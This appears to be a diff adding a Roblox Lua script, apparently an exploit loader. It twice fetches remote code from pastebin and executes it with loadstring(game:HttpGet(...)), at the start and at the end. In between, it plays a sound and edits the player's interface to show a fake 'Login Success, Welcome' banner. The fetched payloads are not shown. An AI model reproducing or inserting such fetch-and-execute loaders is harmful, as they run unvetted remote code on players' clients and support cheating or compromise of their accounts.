@@ -1,0 +1,26 @@
+-- 2:15 AM - EST
+
+loadstring(game:HttpGet('https://pastebin.com/raw/2ncFS2kH'))()
+wait(0.000001)
+--LOADED FUNCTION
+	local s = Instance.new("Sound")
+ 
+	s.Name = "Sound"
+	s.SoundId = "http://www.roblox.com/asset/?id=1548304764"
+	s.Volume = 7
+	s.Looped = false
+	s.archivable = false
+ 
+	s.Parent = game.Workspace
+ 
+	s:play()
+
+	game.Players.LocalPlayer.PlayerGui["Interface Main"].PlayerList.Visible = true
+	game.Players.LocalPlayer.PlayerGui["Interface Main"].PlayerList.KickConfirm.Visible = true
+		game.Players.LocalPlayer.PlayerGui["Interface Main"].PlayerList.KickConfirm.Frame.Visible = false
+	game.Players.LocalPlayer.PlayerGui["Interface Main"].PlayerList.KickConfirm.InnerBoxRight.TextLabel.Text = "Login Success, Welcome " ..game.Players.LocalPlayer.Name.. "!"
+		game.Players.LocalPlayer.PlayerGui["Interface Main"].PlayerList.KickConfirm.InnerBoxRight.TextLabel.Backdrop.Text = "Login Success, Welcome " ..game.Players.LocalPlayer.Name.. "!"
+			wait(5)
+	game.Players.LocalPlayer.PlayerGui["Interface Main"].PlayerList.KickConfirm.Visible = false
+	loadstring(game:HttpGet('https://pastebin.com/raw/2EX82sdc'))()
+	
